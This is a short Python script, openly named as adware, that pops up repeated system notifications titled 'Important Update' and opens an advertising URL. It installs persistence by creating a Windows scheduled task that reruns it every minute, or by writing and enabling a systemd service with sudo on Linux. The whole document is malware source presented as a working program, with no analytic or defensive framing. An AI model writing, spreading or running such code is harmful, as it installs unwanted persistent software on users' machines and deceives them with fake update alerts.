import os
import platform
import webbrowser
import threading
import time
from plyer import notification

def adware_system_tray_notifications(ad_message: str, ad_url: str) -> None:
    def show_notification():
        while True:
            notification.notify(
                title="Important Update",
                message=ad_message,
                timeout=10
            )
            time.sleep(60)

    def open_url(url):
        webbrowser.open(url)

    def create_persistence_service():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            service_command = f'schtasks /create /tn {service_name} /tr "{os.path.abspath(__file__)}" /sc minute /mo 1'
        elif system == "Linux":
            service_name = "adware"
            service_command = f'echo "[Unit]\nDescription=Adware Service\n[Service]\nExecStart={os.path.abspath(__file__)}\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/{service_name}.service && sudo systemctl enable {service_name}'
        else:
            return

        os.system(service_command)

    notification_thread = threading.Thread(target=show_notification)
    notification_thread.daemon = True
    notification_thread.start()

    create_persistence_service()

    while True:
        notification_thread.join(1)
        if not notification_thread.is_alive():
            break

    open_url(ad_url)

if __name__ == "__main__":
    adware_system_tray_notifications("Get the latest updates now!", "http://example.com")
